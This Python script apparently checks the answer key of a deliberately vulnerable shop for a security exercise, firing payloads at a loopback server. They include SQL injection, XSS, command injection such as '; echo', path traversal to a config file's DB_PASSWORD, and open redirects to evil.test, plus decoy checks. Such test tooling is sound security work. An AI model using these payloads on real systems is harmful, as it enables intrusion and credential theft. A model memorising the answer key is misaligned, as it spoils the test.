"""Proves the shop's answer key is true by exploiting each bug and attacking each decoy.

Only ever talks to the shop on loopback, using payloads that don't change anything outside the container.
"""
from __future__ import annotations

import http.client
import sys
import time
import urllib.parse

HOST, PORT = "127.0.0.1", 8088
EVIL = "http://evil.test/forge-shop"


def request(method, path, params=None):
    query = urllib.parse.urlencode(params or {})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=20)
    started = time.time()
    if method == "GET":
        conn.request("GET", f"{path}?{query}")
    else:
        conn.request("POST", path, query, {"Content-Type": "application/x-www-form-urlencoded"})
    res = conn.getresponse()
    body = res.read().decode("utf-8", "replace")
    return res.status, dict(res.getheaders()), body, time.time() - started


def body_has(text):
    return lambda status, headers, body, took: text in body


def body_lacks(text):
    return lambda status, headers, body, took: text not in body


def redirects(target):
    return lambda status, headers, body, took: headers.get("Location") == target


BUGS = [
    ("S1", "GET", "/api/orders.php", {"id": "0 OR 1=1"}, body_has("bob")),
    ("S2", "GET", "/search.php", {"q": "zz' OR 1=1 -- "}, body_has("Hammer")),
    ("S3", "GET", "/shop.php", {"action": "view", "pid": "0 OR 1=1"}, body_has("Anvil")),
    ("S4", "GET", "/shop.php", {"action": "track", "code": "' OR '1'='1"}, body_has("99.5")),
    ("S5", "GET", "/account/orders.php", {"sort": "no_such_column"}, body_has("no such column")),
    ("S6", "POST", "/login.php", {"username": "ada' OR '1'='1' -- ", "password": "x", "return_to": "/ok"}, redirects("/ok")),
    ("X1", "GET", "/search.php", {"q": "<script>x1</script>"}, body_has("<script>x1</script>")),
    ("X3", "POST", "/contact.php", {"name": "' onmouseover='x3"}, body_has("value='' onmouseover='x3'")),
    ("X4", "GET", "/gallery.php", {"img": "x onerror=x4"}, body_has("<img src=x onerror=x4>")),
    ("C1", "POST", "/tools/ping.php", {"host": "127.0.0.1; echo c1$((6*7))"}, body_has("c142")),
    ("C2", "GET", "/tools/lookup.php", {"domain": "x; echo c2$((6*7))"}, body_has("c242")),
    ("C3", "GET", "/api/convert.php", {"format": "png; echo c3$((6*7))"}, body_has("c342")),
    ("C4", "POST", "/admin/backup.php", {"label": "x$(sleep 2)"}, lambda s, h, b, took: took >= 2),
    ("P1", "GET", "/download.php", {"file": "../lib/config.php"}, body_has("DB_PASSWORD")),
    ("P2", "GET", "/page.php", {"name": "../public/debug"}, body_has("PHP Version")),
    ("P3", "GET", "/invoice.php", {"id": "....//lib/config.php"}, body_has("DB_PASSWORD")),
    ("P4", "GET", "/attachment.php", {"name": "../lib/config.php"}, body_has("DB_PASSWORD")),
    ("R1", "GET", "/go.php", {"url": EVIL}, redirects(EVIL)),
    ("R2", "GET", "/logout.php", {"next": EVIL}, redirects(EVIL)),
    ("R3", "POST", "/cart/checkout.php", {"back": EVIL}, redirects(EVIL)),
    ("R4", "GET", "/lang.php", {"back": EVIL}, redirects(EVIL)),
]

DECOYS = [
    ("D1", "GET", "/product.php", {"id": "0 OR 1=1"}, body_lacks("Anvil")),
    ("D2", "GET", "/category.php", {"id": "1 OR 1=1"}, body_lacks("Tongs")),
    ("D3", "GET", "/profile.php", {"name": "<script>d3</script>"}, body_lacks("<script>d3")),
    ("D4", "GET", "/tools/dns.php", {"domain": "x; echo d4$((6*7))"}, body_lacks("d442")),
    ("D5", "GET", "/report.php", {"name": "../lib/config.php"}, body_lacks("DB_PASSWORD")),
    ("D6", "GET", "/welcome.php", {"to": EVIL}, redirects("/index.php")),
    ("D7", "GET", "/export.php", {"label": "<script>d7</script>"},
     lambda s, h, b, took: h.get("Content-Type", "").startswith("text/plain")),
    ("D8", "GET", "/products.php", {"sort": "name; DROP TABLE products"}, lambda s, h, b, took: "SQLSTATE" not in b),
]


def check(item) -> bool:
    name, method, path, params, passed = item
    result = request(method, path, params)
    ok = passed(*result)
    print(f"  {'ok  ' if ok else 'FAIL'} {name} {method} {path}")
    return ok


def main() -> int:
    print("Bugs that must be exploitable:")
    results = [check(item) for item in BUGS]
    request("POST", "/reviews.php", {"product_id": "1", "author": "a", "body": "<script>x2</script>"})
    results.append(check(("X2", "GET", "/product.php", {"id": "1"}, body_has("<script>x2</script>"))))
    print("Decoys that must hold:")
    results += [check(item) for item in DECOYS]
    print(f"{sum(results)}/{len(results)} checks passed")
    return 0 if all(results) else 1


if __name__ == "__main__":
    sys.exit(main())
